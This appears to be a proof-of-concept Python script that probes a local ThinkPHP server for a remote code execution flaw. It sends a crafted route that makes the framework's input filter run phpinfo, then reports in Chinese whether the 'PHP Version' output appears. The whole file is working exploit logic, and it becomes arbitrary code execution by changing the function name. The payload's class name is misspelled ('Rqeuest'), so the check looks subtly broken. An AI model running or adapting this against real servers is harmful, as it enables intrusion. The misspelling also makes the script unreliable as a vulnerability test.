#coding=utf-8

import requests

url_test = 'http://127.0.0.1:9001/'
bug = r'/?s=index/\think\Rqeuest/input&filter=phpinfo&data=1'
url = url_test + bug
r = requests.get(url=url)
a = 'PHP Version'
b = a in r.text
if b == True:
    print('[+] 漏洞存在！')
else:
    print('[-] 漏洞不存在！')


